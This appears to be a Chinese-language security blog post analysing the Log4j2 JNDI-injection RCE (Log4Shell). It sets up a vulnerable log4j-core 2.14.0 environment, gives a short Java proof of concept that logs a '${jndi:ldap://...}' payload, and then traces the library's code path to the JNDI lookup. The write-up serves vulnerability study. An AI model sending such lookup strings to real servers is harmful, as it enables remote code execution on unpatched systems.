<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>log4j | Hurn's Blog</title><meta name="description" content="log4j - Hurn"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="Hurn's Blog"><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="Hurn's Blog"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/Dreyer" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">log4j</h1><div class="post-info"><a></a>2022-06-13</div><div class="post-content"><h1 id="0x0-Apache-Log4j2"><a href="#0x0-Apache-Log4j2" class="headerlink" title="0x0. Apache Log4j2"></a>0x0. Apache Log4j2</h1><p>Apache Log4j2 ， 简单来说是Java中的一套日志系统，用来控制如何输出、打印日志，功能很多，比如：可以定义各种格式、控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等，非常方便的分析、存储日志。</p>
<p>Log4j2的三大组件:</p>
<ul>
<li>Logger：日志记录器，负责收集处理日志记录</li>
<li>Appender：日志存放的地方，负责日志的输出</li>
<li>Layout：日志格式化，负责日志输出的形式</li>
</ul>
<h1 id="0x1-漏洞复现"><a href="#0x1-漏洞复现" class="headerlink" title="0x1. 漏洞复现"></a>0x1. 漏洞复现</h1><p>环境：</p>
<p>POM.xml</p>
<pre><code class="xml">&lt;dependency&gt;
  &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
  &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
  &lt;version&gt;2.14.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>log4j2.xml ， 日志的配置文件</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;

&lt;configuration status=&quot;error&quot;&gt;
    &lt;appenders&gt;
        &lt;!--        配置Appenders输出源为Console和输出语句SYSTEM_OUT--&gt;
        &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot; &gt;
            &lt;!--            配置Console的模式布局--&gt;
            &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n&quot;/&gt;
        &lt;/Console&gt;
    &lt;/appenders&gt;
    &lt;loggers&gt;
        &lt;root level=&quot;error&quot;&gt;
            &lt;appender-ref ref=&quot;Console&quot;/&gt;
        &lt;/root&gt;
    &lt;/loggers&gt;
&lt;/configuration&gt;
</code></pre>
<p>POC:</p>
<pre><code class="java">package log4j;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class log4j &#123;
    private static final Logger logger = LogManager.getLogger(log4j.class);
    public static void main(String[] args) &#123;
        String a=&quot;$&#123;java:os&#125;&quot;;
        logger.error(a);
        logger.error(&quot;$&#123;jndi:ldap://127.0.0.1:1389/Exploit&#125;&quot;);
    &#125;
&#125;
</code></pre>
<p><img src="/2022/06/13/Java/log4j/image-20220613171855751.png" alt="image-20220613171855751"></p>
<h1 id="0x2-漏洞分析"><a href="#0x2-漏洞分析" class="headerlink" title="0x2. 漏洞分析"></a>0x2. 漏洞分析</h1><p>Log4j2 RCE，这个洞的核心是JNDI注入，下面分析怎么走到JNDI的：</p>
<ol>
<li>从堆栈以及一些分析看，在processLogEvent之前都是一些封装、参数传递</li>
</ol>
<img src="/2022/06/13/Java/log4j/image-20220613201104402.png" alt="image-20220613201104402" style="zoom:50%;">

<p>org.apache.logging.log4j.core.Logger#isEnabled(org.apache.logging.log4j.Level, org.apache.logging.log4j.Marker, java.lang.String, java.lang.Throwable)</p>
<p>检查日志的级别</p>
<p><img src="/2022/06/13/Java/log4j/image-20220613205235110.png" alt="image-20220613205235110"></p>
<p>org.apache.logging.log4j.core.config.LoggerConfig#processLogEvent</p>
<pre><code class="java">    private void processLogEvent(final LogEvent event, final LoggerConfigPredicate predicate) &#123;
        event.setIncludeLocation(isIncludeLocation());
        if (predicate.allow(this)) &#123;
            callAppenders(event);
        &#125;
        logParent(event, predicate);
    &#125;
</code></pre>
<ol start="2">
<li>根据配置文件选择appender输出的位置，</li>
</ol>
<pre><code class="java">@PerformanceSensitive(&quot;allocation&quot;)
protected void callAppenders(final LogEvent event) &#123;
    final AppenderControl[] controls = appenders.get();
    //noinspection ForLoopReplaceableByForEach
    for (int i = 0; i &lt; controls.length; i++) &#123;
        controls[i].callAppender(event);
    &#125;
&#125;
</code></pre>
<p><img src="/2022/06/13/Java/log4j/image-20220613202920261.png" alt="image-20220613202920261"></p>
<ol start="3">
<li>根据配置文件中的layout选择如何格式化，并且进行编码输出至指定的地方，这里是Console</li>
</ol>
<p>org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender#tryAppend</p>
<p><img src="/2022/06/13/Java/log4j/image-20220613203111297.png" alt="image-20220613203111297"></p>
<p>解析字符串</p>
<p><img src="/2022/06/13/Java/log4j/image-20220613204816752.png" alt="image-20220613204816752"></p>
<p>对数据进行匹配</p>
<p><img src="/2022/06/13/Java/log4j/image-20220613210841886.png" alt="image-20220613210841886"></p>
<ol start="4">
<li>根据字符串中的内容是否存在特殊字符，判断是否存在特殊字符</li>
</ol>
<p><img src="/2022/06/13/Java/log4j/image-20220613210949360.png" alt="image-20220613210949360"></p>
<p>根据prefix选择Lookup，下面就是JNDI了</p>
<p><img src="/2022/06/13/Java/log4j/image-20220613185308720.png" alt="image-20220613185308720"></p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1786/">https://paper.seebug.org/1786/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/263325#h2-3">https://www.anquanke.com/post/id/263325#h2-3</a></p>
</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2022/06/13/Java/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">prev</a><a class="next" href="/2022/06/12/%E5%86%85%E7%BD%91/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/">next</a></div><div class="copyright"><p>&copy; 2023 <a href="http://example.com">Hurn</a>.<br>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a href="https://github.com/Dreyer/hexo-theme-artemis" target="_blank">Artemis</a>.</p></div></footer></div></body></html>